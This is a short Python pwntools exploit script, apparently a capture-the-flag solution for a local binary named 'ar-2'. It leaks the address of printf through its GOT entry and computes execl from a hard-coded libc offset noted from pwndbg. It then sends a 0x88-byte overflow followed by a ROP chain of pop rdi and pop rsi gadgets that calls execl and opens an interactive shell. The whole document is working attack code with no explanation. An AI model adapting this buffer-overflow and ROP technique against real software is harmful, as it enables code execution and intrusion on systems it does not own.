#!/usr/bin/env python

from pwn import *

p = process('./ar-2')

p.recv()
gotprintf = p.elf.got['printf']

p.sendline(str(8))
p.recv()
p.sendline(hex(gotprintf))

data = p.recv()

printf = u64(data[30:38])
print(hex(printf))

"""
$1 = {<text variable, no debug info>} 0x7fe31bd7aa20 <__GI_execl>
pwndbg> print printf
$2 = {<text variable, no debug info>} 0x7fe31bd03800 <__printf>
"""

offset = 0x7fe31bd7aa20 - 0x7fe31bd03800

execl = printf + offset

"""
0x400036:       "8"
0x0000000000400a33 : pop rdi ; ret
0x0000000000400a31 : pop rsi ; pop r15 ; ret
"""
pop_rdi = p64(0x400a33)
pop_rsi_r15 = p64(0x400a31)
string = p64(0x400036)

buf = "A" * 0x88
buf += pop_rdi
buf += string
buf += pop_rsi_r15
buf += p64(0)
buf += p64(0)
buf += p64(execl)

p.sendline(buf)
p.interactive()
